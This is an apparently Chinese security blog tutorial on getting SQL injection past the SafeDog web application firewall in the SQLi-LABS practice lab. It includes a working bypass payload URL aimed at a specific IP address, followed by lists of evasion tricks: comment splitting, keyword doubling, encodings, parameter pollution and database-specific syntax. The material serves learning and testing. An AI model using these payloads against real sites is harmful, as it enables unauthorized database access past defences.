<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>web安全-SQL注入-认识安全狗-WAF绕过常用方法以及示例 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="web安全-SQL注入-认识安全狗-WAF绕过常用方法以及示例" />
<meta property="og:description" content="一、安全狗 1.主页 2.设置 一般许多人在安装了安全狗以后，都会保持它的默认设置。
可以看到有的保护处于关闭状态，因为虽然将防护设置全部打开会使网站更加安全，但是这也会导致有些正常的访问会产生误报而被拦截。
3.注入测试 &lt;SQLi-LABS-Less2&gt; 采用正常的方法进行注入，可以看得被安全狗给拦截了，此时使用的提交方式是GET。 换一种提交方式进行提交，采用POST请求进行注入，可以看到网页访问进去了，但是网页的内容并不正常。 原因是网站的源代码会决定接收方式，比如有的代码只接收GET请求，有的代码可以全部接收。 分析源代码可以看到，此关只接收GET提交方式的请求，因此采用POST提交的注入内容网站并没有接收。 接下来将网站原码内的接收方式改为REQUEST。 再次尝试进行注入，可以看到网站成功接收了。 尝试继续进行注入。 安全狗再次对注入内容进行了拦截。 在安全狗内可以看到拦截的对应选项。 将对POST内容的拦截选项给删除掉并重启服务器。 可以看到此时的注入便可以正常得到回显。 下面将安全狗设置给还原再次进行操作（原码的依然保持修改为REQUEST）。 首先尝试将注入的内容进行省略书写，可以看到安全狗不进行拦截了，但是得不到想要的回显数据。 由此可以判断出安全狗拦截的是“数据”，因此可以考虑以下的方法进行绕过。 当单独对“database”和单独对“()”进行注入时，安全狗均不进行拦截，仅对“database()”整体进拦截。 因此我们便可以想到一个思路：对“database()”进行拆分，但是不影响到它的运行。 这里采用“/**/”进行拆分，可以看到网页正常回显了数据库名称。 查看安全狗可以发现，其实上述的成功注入也是钻了安全狗的空子，因为安全狗对正常GET等的拦截比较多，对REQUEST的拦截并不多。 在此将原码改回GET接收方式。 再次注入可见此时就算没有查询数据库的注入也会被安全狗拦截，原因在“union select”关键字被拦截。 因为其触发了安全狗里的此项规则。 将注入语句写成如下样式即可成功注入。 http://39.96.44.170/sqlilabs/Less-2/?id=-1 union%23a%0Aselect 1,2,3%23 分析： %23————————————&gt;# a——————————————&gt;a %0A————————————&gt;换行 此时的sql语句样式： union #a select 1,2,3# 其中“#”在sql语句中是注释的意思，加入“#”是为了让安全狗在匹配的时候只匹配到“union”， 但是当安全狗匹配到“#”依然不停止继续匹配时，就会匹配到“a”，依然不会进行拦截， 同时“#”也将“a”给注释掉了，因此不会对sql语句的执行产生影响， 接下来是换行，到了下一行，是为了截至让安全狗继续匹配， 如果依然继续匹配，就会匹配到“select”，但是经过上一步的实验，可以发现单独的“select”也并不会触发安全狗的拦截。 二、WAF绕过 &lt;应用层&gt; 1.参数污染 当网页为此源代码时
在网址内输入以下内容后，网页会返回后者“3”，而不会将“12”返回。
2.大小写/关键字替换 id=1 UnIoN/**/SeLeCT 1,user()
Hex() bin() 等价于 ascii()
Sleep() 等价于 benchmark()
Mid()substring() 等价于 substr()
@@user 等价于 User()" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/07822f4d83323065b611852b37e3edbe/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-20T22:33:56+08:00" />
<meta property="article:modified_time" content="2023-01-20T22:33:56+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">web安全-SQL注入-认识安全狗-WAF绕过常用方法以及示例</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <div class="kdocs-document"> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:642px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:93.45794%;height:0;"> 
    <img src="https://images2.imgbox.com/19/2c/jrF7siRR_o.png" style="margin-left:;display:block;width:642px;margin-top:-93.45794%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h2 style="">一、安全狗</h2> 
 <h3 style="">1.主页</h3> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:900px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:66.44444%;height:0;"> 
    <img src="https://images2.imgbox.com/e7/ec/O5r0l0tq_o.png" style="margin-left:;display:block;width:900px;margin-top:-66.44444%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h3 style="">2.设置</h3> 
 <p style="text-indent:1.4em;">一般许多人在安装了安全狗以后，都会保持它的默认设置。</p> 
 <p style="text-indent:1.4em;">可以看到有的保护处于关闭状态，因为虽然将防护设置全部打开会使网站更加安全，但是这也会导致有些正常的访问会产生误报而被拦截。</p> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:781px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:66.58131%;height:0;"> 
    <img src="https://images2.imgbox.com/f4/67/pQDDVHzk_o.png" style="margin-left:;display:block;width:781px;margin-top:-66.58131%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:897px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:66.55518%;height:0;"> 
    <img src="https://images2.imgbox.com/fd/88/Pg4BVWCA_o.png" style="margin-left:;display:block;width:897px;margin-top:-66.55518%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:786px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:66.03053%;height:0;"> 
    <img src="https://images2.imgbox.com/67/b1/VhNVfpbE_o.png" style="margin-left:;display:block;width:786px;margin-top:-66.03053%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:778px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:66.70951%;height:0;"> 
    <img src="https://images2.imgbox.com/6a/c6/WnRaWRHb_o.png" style="margin-left:;display:block;width:778px;margin-top:-66.70951%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h3 style="">3.注入测试</h3> 
 <h3 style="text-align:left;"><span class="kdocs-color" style="background-color:rgb(251, 245, 179);"><span class="kdocs-bold" style="font-weight:bold;">&lt;SQLi-LABS-Less2&gt;</span></span></h3> 
 <h4 style="text-indent:1.4em;">采用正常的方法进行注入，可以看得被安全狗给拦截了，此时使用的提交方式是GET。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:822px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:72.9927%;height:0;"> 
    <img src="https://images2.imgbox.com/65/41/vc1KcC2C_o.png" style="margin-left:;display:block;width:822px;margin-top:-72.9927%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">换一种提交方式进行提交，采用POST请求进行注入，可以看到网页访问进去了，但是网页的内容并不正常。</h4> 
 <h4 style="text-indent:1.4em;">原因是网站的源代码会决定接收方式，比如有的代码只接收GET请求，有的代码可以全部接收。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:828px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:72.46377%;height:0;"> 
    <img src="https://images2.imgbox.com/75/e0/f3a9IWSb_o.png" style="margin-left:;display:block;width:828px;margin-top:-72.46377%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">分析源代码可以看到，此关只接收GET提交方式的请求，因此采用POST提交的注入内容网站并没有接收。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:941px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:63.76195%;height:0;"> 
    <img src="https://images2.imgbox.com/5d/89/1BzGpQXB_o.png" style="margin-left:;display:block;width:941px;margin-top:-63.76195%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">接下来将网站原码内的接收方式改为REQUEST。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:944px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:63.55932%;height:0;"> 
    <img src="https://images2.imgbox.com/09/ae/gCtLD54C_o.png" style="margin-left:;display:block;width:944px;margin-top:-63.55932%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">再次尝试进行注入，可以看到网站成功接收了。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:819px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.26007%;height:0;"> 
    <img src="https://images2.imgbox.com/8d/5a/BEqaVGb3_o.png" style="margin-left:;display:block;width:819px;margin-top:-73.26007%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">尝试继续进行注入。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:818px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.34963%;height:0;"> 
    <img src="https://images2.imgbox.com/a0/7f/yMvqBaVP_o.png" style="margin-left:;display:block;width:818px;margin-top:-73.34963%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:822px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:72.9927%;height:0;"> 
    <img src="https://images2.imgbox.com/46/8e/4MsXwvsi_o.png" style="margin-left:;display:block;width:822px;margin-top:-72.9927%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">安全狗再次对注入内容进行了拦截。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:820px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.17073%;height:0;"> 
    <img src="https://images2.imgbox.com/aa/0d/f4ES7R4D_o.png" style="margin-left:;display:block;width:820px;margin-top:-73.17073%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">在安全狗内可以看到拦截的对应选项。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:896px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:66.74107%;height:0;"> 
    <img src="https://images2.imgbox.com/d4/fd/8qHqXFKI_o.png" style="margin-left:;display:block;width:896px;margin-top:-66.74107%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">将对POST内容的拦截选项给删除掉并重启服务器。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:899px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:66.51835%;height:0;"> 
    <img src="https://images2.imgbox.com/4f/60/cZu24MNV_o.png" style="margin-left:;display:block;width:899px;margin-top:-66.51835%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:899px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:66.62959%;height:0;"> 
    <img src="https://images2.imgbox.com/0c/89/jH7U1zof_o.png" style="margin-left:;display:block;width:899px;margin-top:-66.62959%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">可以看到此时的注入便可以正常得到回显。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:821px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.081604%;height:0;"> 
    <img src="https://images2.imgbox.com/83/f4/tU9x2UIc_o.png" style="margin-left:;display:block;width:821px;margin-top:-73.081604%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <hr> 
 <h4 style="text-indent:1.4em;">下面将安全狗设置给还原再次进行操作（原码的依然保持修改为REQUEST）。</h4> 
 <h4 style="text-indent:1.4em;">首先尝试将注入的内容进行省略书写，可以看到安全狗不进行拦截了，但是得不到想要的回显数据。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:822px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:72.9927%;height:0;"> 
    <img src="https://images2.imgbox.com/ca/28/aCxXcErG_o.png" style="margin-left:;display:block;width:822px;margin-top:-72.9927%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">由此可以判断出安全狗拦截的是“数据”，因此可以考虑以下的方法进行绕过。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:332px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:128.31325%;height:0;"> 
    <img src="https://images2.imgbox.com/1a/fb/xIeRQTXs_o.png" style="margin-left:;display:block;width:332px;margin-top:-128.31325%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">当单独对“database”和单独对“()”进行注入时，安全狗均不进行拦截，仅对“database()”整体进拦截。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:819px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.26007%;height:0;"> 
    <img src="https://images2.imgbox.com/57/b9/u1uKawQo_o.png" style="margin-left:;display:block;width:819px;margin-top:-73.26007%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:817px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.439415%;height:0;"> 
    <img src="https://images2.imgbox.com/8d/cb/ExtzpPK5_o.png" style="margin-left:;display:block;width:817px;margin-top:-73.439415%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">因此我们便可以想到一个思路：对“database()”进行拆分，但是不影响到它的运行。</h4> 
 <h4 style="text-indent:1.4em;">这里采用“/**/”进行拆分，可以看到网页正常回显了数据库名称。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:824px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:72.81554%;height:0;"> 
    <img src="https://images2.imgbox.com/ef/0a/0BROVM7M_o.png" style="margin-left:;display:block;width:824px;margin-top:-72.81554%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <hr> 
 <h4 style="text-indent:1.4em;">查看安全狗可以发现，其实上述的成功注入也是钻了安全狗的空子，因为安全狗对正常GET等的拦截比较多，对REQUEST的拦截并不多。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:901px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:66.48169%;height:0;"> 
    <img src="https://images2.imgbox.com/7a/11/10kTDatS_o.png" style="margin-left:;display:block;width:901px;margin-top:-66.48169%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">在此将原码改回GET接收方式。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:948px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:63.291138%;height:0;"> 
    <img src="https://images2.imgbox.com/2a/6e/93GRMd4H_o.png" style="margin-left:;display:block;width:948px;margin-top:-63.291138%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">再次注入可见此时就算没有查询数据库的注入也会被安全狗拦截，原因在“union select”关键字被拦截。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:823px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:72.90401%;height:0;"> 
    <img src="https://images2.imgbox.com/9e/db/2T9YEOCE_o.png" style="margin-left:;display:block;width:823px;margin-top:-72.90401%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <p style=""></p> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:821px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.081604%;height:0;"> 
    <img src="https://images2.imgbox.com/f2/67/YeU7rzbO_o.png" style="margin-left:;display:block;width:821px;margin-top:-73.081604%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:820px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.17073%;height:0;"> 
    <img src="https://images2.imgbox.com/9b/58/nbdZbr9u_o.png" style="margin-left:;display:block;width:820px;margin-top:-73.17073%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:821px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.081604%;height:0;"> 
    <img src="https://images2.imgbox.com/b7/15/TftBPbvd_o.png" style="margin-left:;display:block;width:821px;margin-top:-73.081604%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:819px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.26007%;height:0;"> 
    <img src="https://images2.imgbox.com/38/69/VZrt1SbF_o.png" style="margin-left:;display:block;width:819px;margin-top:-73.26007%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">因为其触发了安全狗里的此项规则。</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:894px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:67.00224%;height:0;"> 
    <img src="https://images2.imgbox.com/01/71/1H20Fci0_o.png" style="margin-left:;display:block;width:894px;margin-top:-67.00224%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-indent:1.4em;">将注入语句写成如下样式即可成功注入。</h4> 
 <pre class="kdocs-bash"><code class="language-bash">http://39.96.44.170/sqlilabs/Less-2/?id=-1 union%23a%0Aselect 1,2,3%23

分析：
%23————————————&gt;#
a——————————————&gt;a
%0A————————————&gt;换行

此时的sql语句样式：
union #a
select 1,2,3#

其中“#”在sql语句中是注释的意思，加入“#”是为了让安全狗在匹配的时候只匹配到“union”，
但是当安全狗匹配到“#”依然不停止继续匹配时，就会匹配到“a”，依然不会进行拦截，
同时“#”也将“a”给注释掉了，因此不会对sql语句的执行产生影响，
接下来是换行，到了下一行，是为了截至让安全狗继续匹配，
如果依然继续匹配，就会匹配到“select”，但是经过上一步的实验，可以发现单独的“select”也并不会触发安全狗的拦截。</code></pre> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:820px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.17073%;height:0;"> 
    <img src="https://images2.imgbox.com/ac/38/0QoSmvin_o.png" style="margin-left:;display:block;width:820px;margin-top:-73.17073%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <hr> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:833px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:72.02881%;height:0;"> 
    <img src="https://images2.imgbox.com/70/f2/Wd3dHPA6_o.png" style="margin-left:;display:block;width:833px;margin-top:-72.02881%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:1102px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:54.44646%;height:0;"> 
    <img src="https://images2.imgbox.com/22/83/cHj2YpQQ_o.png" style="margin-left:;display:block;width:1102px;margin-top:-54.44646%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <hr> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:819px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:73.26007%;height:0;"> 
    <img src="https://images2.imgbox.com/e9/cd/gy5Gi9fp_o.png" style="margin-left:;display:block;width:819px;margin-top:-73.26007%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <hr> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:824px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:72.81554%;height:0;"> 
    <img src="https://images2.imgbox.com/ee/e9/0oXITY0w_o.png" style="margin-left:;display:block;width:824px;margin-top:-72.81554%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h2 style="">二、WAF绕过</h2> 
 <h3 style="text-align:left;"><span class="kdocs-color" style="background-color:rgb(251, 245, 179);"><span class="kdocs-bold" style="font-weight:bold;">&lt;应用层&gt;</span></span></h3> 
 <h4 style="">1.参数污染</h4> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:1026px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:58.47953%;height:0;"> 
    <img src="https://images2.imgbox.com/54/18/307U2FqQ_o.png" style="margin-left:;display:block;width:1026px;margin-top:-58.47953%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <p style="text-indent:1.4em;">当网页为此源代码时</p> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:1375px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:42.036366%;height:0;"> 
    <img src="https://images2.imgbox.com/3b/ad/v8W95tFt_o.png" style="margin-left:;display:block;width:1375px;margin-top:-42.036366%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <p style="text-indent:1.4em;">在网址内输入以下内容后，网页会返回后者“3”，而不会将“12”返回。</p> 
 <div class="kdocs-line-container" style="display:flex;"> 
  <div class="kdocs-img" style="flex-direction:column;max-width:100%;display:flex;width:1268px;justify-content:center;align-items:center;height:auto;"> 
   <div class="kdocs-img" style="padding-top:40.457413%;height:0;"> 
    <img src="https://images2.imgbox.com/c2/18/4zS9lanw_o.png" style="margin-left:;display:block;width:1268px;margin-top:-40.457413%;height:auto;"> 
   </div> 
  </div> 
 </div> 
 <h4 style="text-align:left;">2.大小写/关键字替换</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;text-align:left;"><p>id=1 UnIoN/**/SeLeCT 1,user()</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;text-align:left;"><p>Hex() bin() 等价于 ascii()</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;text-align:left;"><p>Sleep() 等价于 benchmark()</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;text-align:left;"><p>Mid()substring() 等价于 substr()</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;text-align:left;"><p>@@user 等价于 User()</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;text-align:left;"><p>@@Version 等价于 version()</p></li></ul> 
 <h4 style="">3.各种编码</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>大小写，URL，hex，%0A 等</p></li></ul> 
 <h4 style="">4.注释</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>// -- --+ # /**/ + :%00 /!**/等</p></li></ul> 
 <h4 style="">5.再次循环</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>union==uunionnion</p></li></ul> 
 <h4 style="">6.等价替换</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>user()=@@user() and=&amp; or=| ascii=hex 等参数污染</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>?id=1&amp;id=2&amp;id=3</p></li></ul> 
 <h4 style="">7.编码解码及加密解密</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>s-&gt;%73-&gt;%25%37%33</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>hex,unlcode,base64 等</p></li></ul> 
 <h4 style="">8.更改请求提交方式</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>GET POST COOKIE 等</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>POST-&gt;multipart/form-data</p></li></ul> 
 <h4 style="">9.中间件 HPP 参数污染</h4> 
 <h3 style=""><span class="kdocs-color" style="background-color:#FBF5B3;"><span class="kdocs-bold" style="font-weight:bold;">&lt;数据库特性&gt;</span></span></h3> 
 <h4 style="">1.Mysql 技巧 </h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>mysql 注释符有三种：</p></li></ul> 
 <p style="text-indent:1.4em;">#、/*...*/、-- ... (注意--后面有一个空格) </p> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>空格符:</p></li></ul> 
 <p style="padding-left:1.4em;">[0x09,0x0a-0x0d,0x20,0xa0]</p> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>特殊符号：</p></li></ul> 
 <p style="padding-left:1.4em;">%a 换行符</p> 
 <p style="text-indent:1.4em;">可结合注释符使用%23%0a，%2d%2d%0a。 </p> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>内联注释：</p></li></ul> 
 <p style="text-indent:1.4em;">/*!UnIon12345SelEcT*/ 1,user() //数字范围 1000-50540</p> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>mysql 黑魔法</p></li></ul> 
 <p style="text-indent:1.4em;">select{x username}from {x11 test.admin};</p> 
 <h4 style="">2.SQL Server 技巧</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>用来注释掉注射后查询的其余部分：</p></li></ul> 
 <p style="text-indent:1.4em;">/* C 语言风格注释</p> 
 <p style="text-indent:1.4em;">-- SQL 注释</p> 
 <p style="text-indent:1.4em;">; 00％ 空字节</p> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>空白符：</p></li></ul> 
 <p style="text-indent:1.4em;">[0x01-0x20]</p> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>特殊符号：</p></li></ul> 
 <p style="text-indent:1.4em;">%3a 冒号</p> 
 <p style="text-indent:1.4em;">id=1 union:select 1,2 from:admin</p> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>函数变形：</p></li></ul> 
 <p style="text-indent:1.4em;">如 db_name[空白字符]()</p> 
 <h4 style="">3.Oracle 技巧</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>注释符：</p></li></ul> 
 <p style="text-indent:1.4em;">--、/**/</p> 
